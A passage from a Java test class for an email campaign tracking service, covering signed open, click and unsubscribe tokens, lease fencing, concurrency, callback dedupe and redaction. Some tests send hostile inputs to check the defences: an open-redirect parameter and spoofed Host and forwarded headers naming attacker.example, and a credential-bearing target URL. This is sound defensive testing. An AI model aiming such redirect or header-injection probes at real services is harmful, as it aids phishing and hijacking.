	void frozenRetryAlsoRejectsCorruptionInsideCustomHtmlAttributes() {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim claim = insertClaim(
				"<p data-unsubscribe=\"{{unsubscribe_url}}\">Personalized note</p>"
						+ "<a href=\"https://papers.example.org/abs/42\">Paper</a>",
				"Stop {{unsubscribe_url}}.");
		CampaignOutboundPreparer.PreparedOutbound prepared = service.prepare(claim).block();
		String capability = unsubscribeUrl(prepared.text());
		database.sql("UPDATE campaign_recipients SET rendered_html = replace(rendered_html, :valid, :bad) "
					+ "WHERE id = :recipient")
				.bind("valid", capability).bind("bad", capability + ".").bind("recipient", claim.recipientId())
				.fetch().rowsUpdated().block();

		assertThatThrownBy(() -> service.prepare(claim).block())
				.isInstanceOf(IllegalArgumentException.class)
				.hasMessageNotContaining(capability);
	}

	@Test
	void disabledOpenAndClickFlagsCreateOnlyTheRequiredUnsubscribeCapability() {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim original = insertClaim(
				"<a href=\"https://papers.example.org/t/c/catalog\">Paper</a>"
						+ "<img src=\"https://papers.example.org/t/o/figure\" alt=\"Figure\">"
						+ "<a href=\"{{unsubscribe_url}}\">Stop</a>",
				"Stop {{unsubscribe_url}}");
		sql("UPDATE campaigns SET tracking_opens_enabled = false, tracking_clicks_enabled = false WHERE id = '"
				+ original.campaignId() + "'");
		CampaignDeliveryRepository.ProductionClaim claim = withTrackingFlags(original, false, false);

		CampaignOutboundPreparer.PreparedOutbound prepared = service.prepare(claim).block();
		CampaignOutboundPreparer.PreparedOutbound frozenRetry = service.prepare(claim).block();

		assertThat(frozenRetry).isEqualTo(prepared);
		assertThat(prepared.html()).contains("https://papers.example.org/t/c/catalog",
				"https://papers.example.org/t/o/figure")
				.doesNotContain("https://tracking.example.test/t/o/",
						"https://tracking.example.test/t/c/");
		assertThat(count("tracking_tokens")).isEqualTo(1);
		assertThat(text("SELECT token_type FROM tracking_tokens")).isEqualTo("UNSUBSCRIBE");
		assertThat(count("campaign_links")).isZero();
	}

	@Test
	void preparationWithAWrongLeaseWritesNoTrackingArtifactsOrFinalBody() {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim original = insertClaim(
				"<a href=\"{{unsubscribe_url}}\">Unsubscribe</a>", "Stop {{unsubscribe_url}}");
		CampaignDeliveryRepository.ProductionClaim stale = new CampaignDeliveryRepository.ProductionClaim(
				original.recipientId(), original.campaignId(), original.attemptId(), original.attemptNumber(),
				original.idempotencyKey(), original.rfcMessageId(), original.correlationId(), new byte[32],
				original.emailCiphertext(), original.emailNonce(), original.emailHmac(), original.emailDomain(),
				original.smtpAccount(), original.templateVersionId(), original.fromName(), original.fromEmail(),
				original.replyTo(), true, true, true, original.renderedSubject(), original.renderedHtml(), original.renderedText());

		assertThatThrownBy(() -> service.prepare(stale).block())
				.isInstanceOf(IllegalStateException.class)
				.hasMessageNotContaining(original.renderedHtml())
				.hasMessageNotContaining(original.renderedText());
		assertThat(count("tracking_tokens")).isZero();
		assertThat(count("campaign_links")).isZero();
		assertThat(text("SELECT rendered_html FROM campaign_recipients WHERE id = '" + original.recipientId() + "'"))
				.contains("{{unsubscribe_url}}");
	}

	@Test
	void preparationRollsBackEveryArtifactWhenTheLeaseExpiresBeforeTheFinalBodyFence() {
		CampaignDeliveryRepository.ProductionClaim claim = insertClaim(
				"<a href=\"https://papers.example.org/abs/42\">Paper</a>"
						+ "<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}");
		Clock expiresDuringPreparation = new SequencedClock(NOW, NOW.plusSeconds(121));
		CampaignTrackingService service = service(expiresDuringPreparation);

		assertThatThrownBy(() -> service.prepare(claim).block())
				.isInstanceOf(IllegalStateException.class)
				.hasMessage("Campaign preparation lease is no longer active");
		assertThat(count("tracking_tokens")).isZero();
		assertThat(count("campaign_links")).isZero();
		assertThat(text("SELECT rendered_html FROM campaign_recipients WHERE id = '" + claim.recipientId() + "'"))
				.contains("{{unsubscribe_url}}");
	}

	@Test
	void frozenRetryRequiresEveryDurableTokenAndCurrentTrackingFlagsToMatch() {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		for (String type : List.of("OPEN", "CLICK", "UNSUBSCRIBE")) {
			CampaignDeliveryRepository.ProductionClaim claim = insertClaim(
					"<a href=\"https://papers.example.org/abs/42\">Paper</a>"
							+ "<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}");
			service.prepare(claim).block();
			database.sql("DELETE FROM tracking_tokens WHERE campaign_recipient_id = :recipient AND token_type = :type")
					.bind("recipient", claim.recipientId()).bind("type", type).fetch().rowsUpdated().block();
			assertThatThrownBy(() -> service.prepare(claim).block())
					.as(type).isInstanceOf(IllegalArgumentException.class);
		}

		CampaignDeliveryRepository.ProductionClaim openMismatch = insertClaim(
				"<a href=\"https://papers.example.org/abs/42\">Paper</a>"
						+ "<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}");
		service.prepare(openMismatch).block();
		sql("UPDATE campaigns SET tracking_opens_enabled = false WHERE id = '" + openMismatch.campaignId() + "'");
		assertThatThrownBy(() -> service.prepare(withTrackingFlags(openMismatch, false, true)).block())
				.isInstanceOf(IllegalArgumentException.class);

		CampaignDeliveryRepository.ProductionClaim clickMismatch = insertClaim(
				"<a href=\"https://papers.example.org/abs/42\">Paper</a>"
						+ "<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}");
		service.prepare(clickMismatch).block();
		sql("UPDATE campaigns SET tracking_clicks_enabled = false WHERE id = '" + clickMismatch.campaignId() + "'");
		assertThatThrownBy(() -> service.prepare(withTrackingFlags(clickMismatch, true, false)).block())
				.isInstanceOf(IllegalArgumentException.class);
	}

	@Test
	void concurrentRecipientsReuseThePersistedCampaignLinkButReceiveDifferentCapabilities() throws Exception {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		String html = "<a href=\"https://papers.example.org/abs/42\">Paper</a>"
				+ "<a href=\"{{unsubscribe_url}}\">Stop</a>";
		CampaignDeliveryRepository.ProductionClaim first = insertClaim(html, "Stop {{unsubscribe_url}}");
		CampaignDeliveryRepository.ProductionClaim originalSecond = insertClaim(html, "Stop {{unsubscribe_url}}");
		byte[] secondHmac = sha256("different-author@example.org");
		database.sql("UPDATE campaign_recipients SET campaign_id = :campaign, email_hmac = :hmac WHERE id = :recipient")
				.bind("campaign", first.campaignId()).bind("hmac", secondHmac)
				.bind("recipient", originalSecond.recipientId()).fetch().rowsUpdated().block();
		CampaignDeliveryRepository.ProductionClaim second = withCampaignAndHmac(
				originalSecond, first.campaignId(), secondHmac);
		CountDownLatch ready = new CountDownLatch(2);
		CountDownLatch start = new CountDownLatch(1);
		ExecutorService pool = Executors.newFixedThreadPool(2);
		try {
			List<Future<CampaignOutboundPreparer.PreparedOutbound>> futures = List.of(first, second).stream()
					.map(claim -> pool.submit(() -> {
						ready.countDown();
						if (!start.await(10, TimeUnit.SECONDS)) throw new IllegalStateException("barrier timeout");
						return service.prepare(claim).block();
					})).toList();
			assertThat(ready.await(10, TimeUnit.SECONDS)).isTrue();
			start.countDown();
			CampaignOutboundPreparer.PreparedOutbound firstBody = futures.get(0).get(15, TimeUnit.SECONDS);
			CampaignOutboundPreparer.PreparedOutbound secondBody = futures.get(1).get(15, TimeUnit.SECONDS);
			assertThat(clickToken(firstBody.html())).isNotEqualTo(clickToken(secondBody.html()));
		}
		finally {
			pool.shutdownNow();
		}
		assertThat(longValue("SELECT count(*) FROM campaign_links WHERE campaign_id = '" + first.campaignId() + "'"))
				.isEqualTo(1);
		assertThat(longValue("SELECT count(DISTINCT campaign_link_id) FROM tracking_tokens WHERE token_type = 'CLICK' "
				+ "AND campaign_recipient_id IN ('" + first.recipientId() + "','" + second.recipientId() + "')"))
				.isEqualTo(1);
	}

	@Test
	void concurrentRecipientsWithOppositeLinkOrderAcquireCampaignLinksInOneStableOrder() throws Exception {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		String firstHtml = "<a href=\"https://papers.example.org/a\">A</a>"
				+ "<a href=\"https://papers.example.org/b\">B</a>"
				+ "<a href=\"{{unsubscribe_url}}\">Stop</a>";
		String secondHtml = "<a href=\"https://papers.example.org/b\">B</a>"
				+ "<a href=\"https://papers.example.org/a\">A</a>"
				+ "<a href=\"{{unsubscribe_url}}\">Stop</a>";
		CampaignDeliveryRepository.ProductionClaim first = insertClaim(firstHtml, "Stop {{unsubscribe_url}}");
		CampaignDeliveryRepository.ProductionClaim originalSecond = insertClaim(secondHtml, "Stop {{unsubscribe_url}}");
		byte[] secondHmac = sha256("opposite-order-author@example.org");
		database.sql("UPDATE campaign_recipients SET campaign_id = :campaign, email_hmac = :hmac WHERE id = :recipient")
				.bind("campaign", first.campaignId()).bind("hmac", secondHmac)
				.bind("recipient", originalSecond.recipientId()).fetch().rowsUpdated().block();
		CampaignDeliveryRepository.ProductionClaim second = withCampaignAndHmac(
				originalSecond, first.campaignId(), secondHmac);
		CountDownLatch ready = new CountDownLatch(2);
		CountDownLatch start = new CountDownLatch(1);
		ExecutorService pool = Executors.newFixedThreadPool(2);
		try {
			List<Future<CampaignOutboundPreparer.PreparedOutbound>> futures = List.of(first, second).stream()
					.map(claim -> pool.submit(() -> {
						ready.countDown();
						if (!start.await(10, TimeUnit.SECONDS)) throw new IllegalStateException("barrier timeout");
						return service.prepare(claim).block();
					})).toList();
			assertThat(ready.await(10, TimeUnit.SECONDS)).isTrue();
			start.countDown();
			assertThat(futures.get(0).get(15, TimeUnit.SECONDS)).isNotNull();
			assertThat(futures.get(1).get(15, TimeUnit.SECONDS)).isNotNull();
		}
		finally {
			pool.shutdownNow();
		}
		assertThat(longValue("SELECT count(*) FROM campaign_links WHERE campaign_id = '" + first.campaignId() + "'"))
				.isEqualTo(2);
		assertThat(longValue("SELECT count(*) FROM tracking_tokens WHERE token_type = 'CLICK' "
				+ "AND campaign_recipient_id IN ('" + first.recipientId() + "','" + second.recipientId() + "')"))
				.isEqualTo(4);
	}

	@Test
	void openAndClickCallbacksUseHeadWithoutCountingAndDeduplicateByMinute() {
		MutableClock clock = new MutableClock(NOW.plusSeconds(10));
		CampaignTrackingService service = service(clock);
		CampaignDeliveryRepository.ProductionClaim claim = preparedClaim(service);
		String html = text("SELECT rendered_html FROM campaign_recipients WHERE id = '" + claim.recipientId() + "'");
		String openPath = URI.create(openUrl(html)).getPath();
		String clickPath = URI.create(clickUrl(html)).getPath();
		WebTestClient client = callbackClient(service);

		client.head().uri(openPath).exchange().expectStatus().isOk().expectBody().isEmpty();
		client.head().uri(clickPath).exchange().expectStatus().isFound()
				.expectHeader().valueEquals("Location", "https://papers.example.org/abs/42");
		assertThat(count("tracking_events")).isZero();

		for (int request = 0; request < 12; request++) {
			client.get().uri(openPath).header(HttpHeaders.USER_AGENT, "Research Browser").exchange()
					.expectStatus().isOk();
			client.get().uri(builder -> builder.path(clickPath)
					.queryParam("url", "https://attacker.example/redirect").build())
					.header(HttpHeaders.USER_AGENT, "Research Browser").exchange().expectStatus().isFound()
					.expectHeader().valueEquals("Location", "https://papers.example.org/abs/42");
		}
		assertThat(longValue("SELECT count(*) FROM tracking_events WHERE event_type = 'OPEN'")) .isEqualTo(1);
		assertThat(longValue("SELECT count(*) FROM tracking_events WHERE event_type = 'CLICK'")).isEqualTo(1);
		assertThat(text("SELECT classification FROM tracking_events WHERE event_type = 'OPEN'"))
				.isEqualTo("UNCLASSIFIED");
		assertThat(text("SELECT classification FROM tracking_events WHERE event_type = 'CLICK'"))
				.isEqualTo("LIKELY_HUMAN");

		clock.set(clock.instant().plusSeconds(60));
		client.get().uri(openPath).header(HttpHeaders.USER_AGENT, "Research Browser").exchange().expectStatus().isOk();
		assertThat(longValue("SELECT count(*) FROM tracking_events WHERE event_type = 'OPEN'")).isEqualTo(2);
		assertThat(longValue("SELECT extract(epoch FROM first_open_at)::bigint FROM campaign_recipients WHERE id = '"
				+ claim.recipientId() + "'"))
				.isEqualTo(NOW.plusSeconds(10).getEpochSecond());
	}

	@Test
	void callbackDedupeIsAtomicAcrossTwentyFourConcurrentRequestsAndExactMinuteBoundaries() throws Exception {
		Instant minute = NOW.truncatedTo(java.time.temporal.ChronoUnit.MINUTES);
		MutableClock clock = new MutableClock(minute.plusSeconds(59).plusMillis(999));
		CampaignTrackingService service = service(clock);
		CampaignDeliveryRepository.ProductionClaim claim = preparedClaim(service);
		String open = openToken(text("SELECT rendered_html FROM campaign_recipients WHERE id = '"
				+ claim.recipientId() + "'"));
		CountDownLatch ready = new CountDownLatch(24);
		CountDownLatch start = new CountDownLatch(1);
		ExecutorService pool = Executors.newFixedThreadPool(24);
		List<Future<Boolean>> calls = new ArrayList<>();
		try {
			for (int index = 0; index < 24; index++) {
				calls.add(pool.submit(() -> {
					ready.countDown();
					if (!start.await(10, TimeUnit.SECONDS)) throw new IllegalStateException("barrier timeout");
					return service.observeOpen(open, new HttpHeaders(), REQUEST).block();
				}));
			}
			assertThat(ready.await(10, TimeUnit.SECONDS)).isTrue();
			start.countDown();
			for (Future<Boolean> call : calls) assertThat(call.get(15, TimeUnit.SECONDS)).isTrue();
		}
		finally {
			pool.shutdownNow();
		}
		assertThat(count("tracking_events")).isEqualTo(1);

		clock.set(minute.plusSeconds(60));
		assertThat(service.observeOpen(open, new HttpHeaders(), REQUEST).block()).isTrue();
		assertThat(count("tracking_events")).isEqualTo(2);
	}

	@Test
	void callbackDedupeSeparatesOpenFromClickAndEachPersistedLink() {
		CampaignTrackingService service = service(Clock.fixed(NOW.plusSeconds(10), ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim claim = insertClaim(
				"<a href=\"https://papers.example.org/a\">A</a>"
						+ "<a href=\"https://papers.example.org/b\">B</a>"
						+ "<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}");
		CampaignOutboundPreparer.PreparedOutbound prepared = service.prepare(claim).block();
		setRecipientStatus(claim.recipientId(), "SMTP_ACCEPTED");
		String open = openToken(prepared.html());
		List<String> clicks = Jsoup.parseBodyFragment(prepared.html()).select("a[href*='/t/c/']").stream()
				.map(anchor -> anchor.attr("href"))
				.map(url -> url.substring(url.indexOf("/t/c/") + 5)).toList();

		for (int duplicate = 0; duplicate < 2; duplicate++) {
			assertThat(service.observeOpen(open, new HttpHeaders(), REQUEST).block()).isTrue();
			for (String click : clicks) {
				assertThat(service.click(click, new HttpHeaders(), REQUEST, true).block()).isNotNull();
			}
		}

		assertThat(clicks).hasSize(2);
		assertThat(longValue("SELECT count(*) FROM tracking_events WHERE event_type = 'OPEN'"))
				.isEqualTo(1);
		assertThat(longValue("SELECT count(*) FROM tracking_events WHERE event_type = 'CLICK'"))
				.isEqualTo(2);
		assertThat(longValue("SELECT count(DISTINCT campaign_link_id) FROM tracking_events "
				+ "WHERE event_type = 'CLICK'"))
				.isEqualTo(2);
	}

	@Test
	void callbacksCountOnlyActiveSmtpWindowsOrPossiblySentRecipientsAndUnsafeTargetsNeverRedirect() {
		MutableClock clock = new MutableClock(NOW.plusSeconds(10));
		CampaignTrackingService service = service(clock);
		CampaignDeliveryRepository.ProductionClaim claim = insertClaim(
				"<a href=\"https://papers.example.org/abs/42\">Paper</a>"
						+ "<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}");
		CampaignOutboundPreparer.PreparedOutbound prepared = service.prepare(claim).block();
		String open = openToken(prepared.html());
		String click = clickToken(prepared.html());

		assertThat(service.observeOpen(open, new HttpHeaders(), REQUEST).block()).isTrue();
		assertThat(service.click(click, new HttpHeaders(), REQUEST, true).block()).isNotNull();
		assertThat(count("tracking_events")).isEqualTo(2);

		sql("UPDATE campaign_recipients SET status = 'SMTP_ACCEPTED', smtp_accepted_at = now(), "
				+ "delivery_lease_hash = NULL, delivery_lease_expires_at = NULL WHERE id = '" + claim.recipientId() + "'");
		database.sql("UPDATE campaign_links SET target_url = :unsafe WHERE campaign_id = :campaign")
				.bind("unsafe", "https://user:secret@attacker.example/private")
				.bind("campaign", claim.campaignId()).fetch().rowsUpdated().block();
		assertThat(service.click(click, new HttpHeaders(), REQUEST, false).block()).isNull();
		assertThat(service.observeOpen(open, new HttpHeaders(), REQUEST).block()).isTrue();
		assertThat(count("tracking_events")).isEqualTo(2);
	}

	@Test
	void callbackStatusGateAllowsOnlyAnActivelyLeasedConnectingAttemptOrPossiblySentStatus() {
		CampaignTrackingService service = service(Clock.fixed(NOW.plusSeconds(10), ZoneOffset.UTC));
		for (String status : List.of(
				"QUEUED", "CONNECTING", "TEMPORARY_FAILURE", "PERMANENT_FAILURE",
				"SUPPRESSED", "UNSUBSCRIBED", "CANCELED")) {
			CampaignDeliveryRepository.ProductionClaim claim = preparedClaim(service);
			setRecipientStatus(claim.recipientId(), status);
			String html = text("SELECT rendered_html FROM campaign_recipients WHERE id = '" + claim.recipientId() + "'");
			assertThat(service.observeOpen(openToken(html), new HttpHeaders(), REQUEST).block()).as(status).isFalse();
			assertThat(service.click(clickToken(html), new HttpHeaders(), REQUEST, true).block()).as(status).isNull();
		}

		CampaignDeliveryRepository.ProductionClaim expired = insertClaim(
				"<a href=\"https://papers.example.org/expired\">Paper</a>"
						+ "<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}");
		CampaignOutboundPreparer.PreparedOutbound expiredBody = service.prepare(expired).block();
		sql("UPDATE campaign_recipients SET delivery_lease_expires_at = TIMESTAMPTZ '" + NOW
				+ "' WHERE id = '" + expired.recipientId() + "'");
		assertThat(service.observeOpen(openToken(expiredBody.html()), new HttpHeaders(), REQUEST).block()).isFalse();
		assertThat(service.click(clickToken(expiredBody.html()), new HttpHeaders(), REQUEST, true).block()).isNull();

		CampaignDeliveryRepository.ProductionClaim active = insertClaim(
				"<a href=\"https://papers.example.org/active\">Paper</a>"
						+ "<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}");
		CampaignOutboundPreparer.PreparedOutbound activeBody = service.prepare(active).block();
		assertThat(service.observeOpen(openToken(activeBody.html()), new HttpHeaders(), REQUEST).block()).isTrue();
		assertThat(service.click(clickToken(activeBody.html()), new HttpHeaders(), REQUEST, true).block()).isNotNull();

		for (String status : List.of("SMTP_ACCEPTED", "BOUNCED", "OUTCOME_UNKNOWN")) {
			CampaignDeliveryRepository.ProductionClaim claim = preparedClaim(service);
			setRecipientStatus(claim.recipientId(), status);
			String html = text("SELECT rendered_html FROM campaign_recipients WHERE id = '" + claim.recipientId() + "'");
			assertThat(service.observeOpen(openToken(html), new HttpHeaders(), REQUEST).block()).as(status).isTrue();
			assertThat(service.click(clickToken(html), new HttpHeaders(), REQUEST, true).block()).as(status).isNotNull();
		}
		assertThat(count("tracking_events")).isEqualTo(8);
	}

	@Test
	void callerHostAndForwardedHeadersCannotChangeCallbackOriginOrRedirectTarget() {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim claim = preparedClaim(service);
		String html = text("SELECT rendered_html FROM campaign_recipients WHERE id = '" + claim.recipientId() + "'");
		String clickPath = URI.create(clickUrl(html)).getPath();

		callbackClient(service).get().uri(clickPath)
				.header(HttpHeaders.HOST, "attacker.example")
				.header("X-Forwarded-Host", "attacker.example")
				.header("X-Forwarded-Proto", "http")
				.exchange().expectStatus().isFound()
				.expectHeader().valueEquals("Location", "https://papers.example.org/abs/42");
		assertThat(html).contains("https://tracking.example.test/t/c/")
				.doesNotContain("attacker.example");
	}

	@Test
	void callbackClassificationUsesOnlyAllowedCategoriesAndStoresNoRawRequestData() {
		MutableClock clock = new MutableClock(NOW.plusSeconds(10));
		CampaignTrackingService service = service(clock);
		CampaignDeliveryRepository.ProductionClaim claim = preparedClaim(service);
		String html = text("SELECT rendered_html FROM campaign_recipients WHERE id = '" + claim.recipientId() + "'");
		String clickPath = URI.create(clickUrl(html)).getPath();
		WebTestClient client = callbackClient(service);

		client.get().uri(clickPath).header(HttpHeaders.USER_AGENT, "Proofpoint Scanner 198.51.100.44")
				.exchange().expectStatus().isFound();
		client.get().uri(clickPath).header(HttpHeaders.USER_AGENT, "Generic bot 198.51.100.45")
				.exchange().expectStatus().isFound();
		client.get().uri(clickPath).header(HttpHeaders.USER_AGENT, "Browser 198.51.100.46")
				.header("Sec-Purpose", "prefetch").exchange().expectStatus().isFound();

		assertThat(database.sql("SELECT classification FROM tracking_events ORDER BY id")
				.map((row, metadata) -> row.get(0, String.class)).all().collectList().block())
				.containsExactly("SECURITY_SCANNER", "BOT", "PREFETCH");
		String rows = text("SELECT jsonb_agg(to_jsonb(e))::text FROM tracking_events e");
		assertThat(rows).doesNotContain("Proofpoint", "198.51.100", "Generic bot", "Browser");
	}

	@Test
	void malformedExpiredWrongNamespaceAndUnknownCallbacksHaveGenericResponses(CapturedOutput output) {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim claim = preparedClaim(service);
		String html = text("SELECT rendered_html FROM campaign_recipients WHERE id = '" + claim.recipientId() + "'");
		String validOpen = openToken(html);
		String validClick = clickToken(html);
		CampaignTrackingSigner signer = new CampaignTrackingSigner(TRACKING_KEY);
		List<String> badOpenTokens = List.of("invalid", validClick,
				validOpen.substring(0, validOpen.length() - 1) + (validOpen.endsWith("A") ? "B" : "A"),
				signer.issueOpen(claim.recipientId(), NOW.minusSeconds(1)), "x".repeat(513));
		WebTestClient client = callbackClient(service);
		byte[] expected = client.get().uri("/t/o/invalid").exchange().expectStatus().isOk()
				.expectBody(byte[].class).returnResult().getResponseBody();

		for (String token : badOpenTokens) {
			client.get().uri("/t/o/{token}", token).exchange().expectStatus().isOk()
					.expectBody(byte[].class).value(bytes -> assertThat(bytes).containsExactly(expected));
		}
		for (String token : List.of("invalid", validOpen,
				signer.issueClick(claim.recipientId(), UUID.randomUUID(), NOW.minusSeconds(1)))) {
			client.get().uri("/t/c/{token}", token).exchange().expectStatus().isNotFound()
					.expectHeader().valueMatches("Cache-Control", ".*no-store.*")
					.expectHeader().valueEquals("Referrer-Policy", "no-referrer").expectBody().isEmpty();
		}
		client.post().uri(URI.create(clickUrl(html)).getPath()).exchange().expectStatus().isEqualTo(405)
				.expectHeader().valueEquals("Allow", "GET,HEAD");
		assertThat(output.getAll()).doesNotContain(validOpen, validClick);
	}

	@Test
	void campaignRecipientReadPathRedactsFinalCapabilitiesAndRawBodies() {
		CampaignTrackingService tracking = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim claim = preparedClaim(tracking);
		String stored = text("SELECT rendered_html FROM campaign_recipients WHERE id = '" + claim.recipientId() + "'");
		String open = openToken(stored);
		String click = clickToken(stored);
		String unsubscribe = unsubscribeToken(text("SELECT rendered_text FROM campaign_recipients WHERE id = '"
				+ claim.recipientId() + "'"));
		CampaignService campaigns = new CampaignService(new CampaignRepository(database), null,
				new PersonalizationProperties(false, "test", "test", 20), new ObjectMapper(), transactions,
				new CampaignPublicContentRedactor(TRACKING_PROPERTIES.publicBaseUrl()));

		PageResponse<CampaignService.RecipientView> response = campaigns.recipients(claim.campaignId(), 1, 20).block();
		String json;
		try {
			json = new ObjectMapper().findAndRegisterModules().writeValueAsString(response);
		}
		catch (Exception exception) {
			throw new AssertionError(exception);
		}
		assertThat(json).doesNotContain(open, click, unsubscribe,
				"/t/o/", "/t/c/", "/u/", stored)
				.contains("trackingArtifactsRedacted");
	}

	@Test
	void campaignRecipientReadPathRemainsRedactedAfterSomeOrAllTokenRowsAreLost() {
		CampaignTrackingService tracking = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim partial = preparedClaim(tracking);
		CampaignDeliveryRepository.ProductionClaim all = preparedClaim(tracking);
		String partialBody = text("SELECT rendered_html FROM campaign_recipients WHERE id = '"
				+ partial.recipientId() + "'");
		String allBody = text("SELECT rendered_html FROM campaign_recipients WHERE id = '"
				+ all.recipientId() + "'");
		database.sql("DELETE FROM tracking_tokens WHERE campaign_recipient_id = :recipient AND token_type = 'OPEN'")
				.bind("recipient", partial.recipientId()).fetch().rowsUpdated().block();
		database.sql("DELETE FROM tracking_tokens WHERE campaign_recipient_id = :recipient")
				.bind("recipient", all.recipientId()).fetch().rowsUpdated().block();
		CampaignService campaigns = new CampaignService(new CampaignRepository(database), null,
				new PersonalizationProperties(false, "test", "test", 20), new ObjectMapper(), transactions,
				new CampaignPublicContentRedactor());

		String partialJson = json(campaigns.recipients(partial.campaignId(), 1, 20).block());
		String allJson = json(campaigns.recipients(all.campaignId(), 1, 20).block());

		assertThat(partialJson).doesNotContain(partialBody, "/t/o/", "/t/c/", "/u/")
				.contains("\"trackingArtifactsRedacted\":true");
		assertThat(allJson).doesNotContain(allBody, "/t/o/", "/t/c/", "/u/")
				.contains("\"trackingArtifactsRedacted\":true");
	}

	private String json(Object value) {
		try {
			return new ObjectMapper().findAndRegisterModules().writeValueAsString(value);
		}
		catch (Exception exception) {
			throw new AssertionError(exception);
		}
	}

	private WebTestClient callbackClient(CampaignTrackingService campaigns) {
		MailTrackingProperties disabledProperties = new MailTrackingProperties(
				false, "http://localhost:8080", null, Duration.ofDays(30));
		MailTrackingService testMail = new MailTrackingService(
				null, disabledProperties, null, new MailOpenClassifier(), Clock.systemUTC());
		return WebTestClient.bindToController(
				new MailOpenController(testMail, campaigns), new MailClickController(testMail, campaigns)).build();
	}

	private String openUrl(String html) {
		return Jsoup.parseBodyFragment(html).selectFirst("img[src*='/t/o/']").attr("src");
	}

	private String openToken(String html) {
		return openUrl(html).substring(openUrl(html).indexOf("/t/o/") + 5);
	}

	private String clickUrl(String html) {
		return Jsoup.parseBodyFragment(html).selectFirst("a[href*='/t/c/']").attr("href");
	}

	private String clickToken(String html) {
		return clickUrl(html).substring(clickUrl(html).indexOf("/t/c/") + 5);
	}

	private String unsubscribeUrl(String text) {
		int start = text.indexOf("https://tracking.example.test/u/");
		String tail = text.substring(start);
		int whitespace = 0;
		while (whitespace < tail.length() && !Character.isWhitespace(tail.charAt(whitespace))) whitespace++;
		String value = tail.substring(0, whitespace);
		while (!value.isEmpty() && ".,;:!?)]}>\"'".indexOf(value.charAt(value.length() - 1)) >= 0) {
			value = value.substring(0, value.length() - 1);
		}
		return value;
	}

	private String unsubscribeToken(String text) {
		String value = unsubscribeUrl(text);
		return value.substring(value.indexOf("/u/") + 3);
	}

	private CampaignDeliveryRepository.ProductionClaim withTrackingFlags(
			CampaignDeliveryRepository.ProductionClaim claim, boolean opens, boolean clicks
	) {
		return new CampaignDeliveryRepository.ProductionClaim(
				claim.recipientId(), claim.campaignId(), claim.attemptId(), claim.attemptNumber(),
				claim.idempotencyKey(), claim.rfcMessageId(), claim.correlationId(), claim.leaseDigest(),
				claim.emailCiphertext(), claim.emailNonce(), claim.emailHmac(), claim.emailDomain(),
				claim.smtpAccount(), claim.templateVersionId(), claim.fromName(), claim.fromEmail(), claim.replyTo(),
				opens, clicks, true, claim.renderedSubject(), claim.renderedHtml(), claim.renderedText());
	}

	private CampaignDeliveryRepository.ProductionClaim withCampaignAndHmac(
			CampaignDeliveryRepository.ProductionClaim claim, UUID campaignId, byte[] emailHmac
	) {
		return new CampaignDeliveryRepository.ProductionClaim(
				claim.recipientId(), campaignId, claim.attemptId(), claim.attemptNumber(), claim.idempotencyKey(),
				claim.rfcMessageId(), claim.correlationId(), claim.leaseDigest(), claim.emailCiphertext(), claim.emailNonce(),
				emailHmac, claim.emailDomain(), claim.smtpAccount(), claim.templateVersionId(), claim.fromName(),
				claim.fromEmail(), claim.replyTo(), true, true, true, claim.renderedSubject(), claim.renderedHtml(),
				claim.renderedText());
	}

	private void setRecipientStatus(UUID recipient, String status) {
		database.sql("""
				UPDATE campaign_recipients
				SET status = :status, delivery_lease_hash = NULL, delivery_lease_expires_at = NULL,
				    outcome_unknown_at = CASE WHEN :status = 'OUTCOME_UNKNOWN' THEN :now ELSE NULL END,
				    outcome_unknown_reason = CASE WHEN :status = 'OUTCOME_UNKNOWN' THEN 'POST_DATA_AMBIGUOUS' ELSE NULL END
				WHERE id = :recipient
				""").bind("status", status).bind("now", NOW).bind("recipient", recipient)
				.fetch().rowsUpdated().block();
	}

	private String joinAcrossSpan(String token, String prefix) {
		return prefix + "<span>" + token.substring(prefix.length()) + "</span>";
	}

	private String joinAcrossComment(String token, String prefix) {
		return prefix + "<!-- split -->" + token.substring(prefix.length());
	}

	private String fullWidthAscii(String value) {
		StringBuilder transformed = new StringBuilder(value.length());
		for (int index = 0; index < value.length(); index++) {
			char character = value.charAt(index);
			transformed.append(character >= 0x21 && character <= 0x7e
					? (char) (character + 0xfee0) : character);
		}
		return transformed.toString();
	}

	private String compatibilityPercentEncoded(String value) {
		StringBuilder encoded = new StringBuilder(value.length() * 3);
		for (byte octet : value.getBytes(StandardCharsets.US_ASCII)) {
			int unsigned = Byte.toUnsignedInt(octet);
			encoded.append('％').append(Character.toUpperCase(Character.forDigit(unsigned >>> 4, 16)))
					.append(Character.toUpperCase(Character.forDigit(unsigned & 0xf, 16)));
		}
		return encoded.toString();
	}

	private record PreloadedCapability(String name, String subject, String html, String text) { }

	private static final class MutableClock extends Clock {
		private final AtomicReference<Instant> now;

		private MutableClock(Instant now) {
			this.now = new AtomicReference<>(now);
		}

		void set(Instant value) {
			now.set(value);
		}

		@Override public ZoneId getZone() { return ZoneOffset.UTC; }
